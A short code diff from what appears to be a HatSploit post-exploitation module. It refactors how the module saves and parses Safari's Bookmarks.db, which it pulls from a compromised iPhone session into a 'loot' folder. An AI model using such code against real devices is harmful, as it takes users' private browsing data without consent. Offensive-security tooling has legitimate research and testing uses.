@@ -43,12 +43,14 @@ class HatSploitModule(Module, SessionTools, DBTools):
         session = self.get_session(session)
 
         if session:
+            loot = self.config.path_config['loot_path']
+
             if session.download(
-                '/private/var/mobile/Library/Safari/Bookmarks.db', config.path_config['loot_path']):
+                '/private/var/mobile/Library/Safari/Bookmarks.db', loot):
 
                 self.print_process("Parsing bookmarks database...")
                 try:
-                    bookmarks = self.parse_safari_bookmarks(config.path_config['loot_path'] + 'Bookmarks.db')
+                    bookmarks = self.parse_safari_bookmarks(loot + 'Bookmarks.db')
                 except Exception:
                     self.print_error("Failed to parse bookmarks database!")
                     return
